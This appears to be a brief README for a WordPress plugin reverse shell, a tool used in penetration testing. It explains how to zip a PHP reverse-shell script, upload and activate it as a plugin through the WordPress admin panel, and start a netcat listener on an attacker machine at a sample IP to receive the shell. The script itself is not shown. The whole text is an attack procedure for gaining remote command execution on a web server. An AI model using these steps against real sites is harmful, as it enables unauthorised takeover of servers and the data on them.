# wordpress_plugin_reverse_shell.php
1.) Zip up php file. NOTE: PHP script uses example attacker machine IP - 192.168.0.1
2.) Navigate WP UI -> Plugins -> Add New -> Upload Plugin 
   -> Browse -> Install Now -> Activate Plugin.
3.) Setup listening port with netcat from attacker machine: netcat -lvp 80
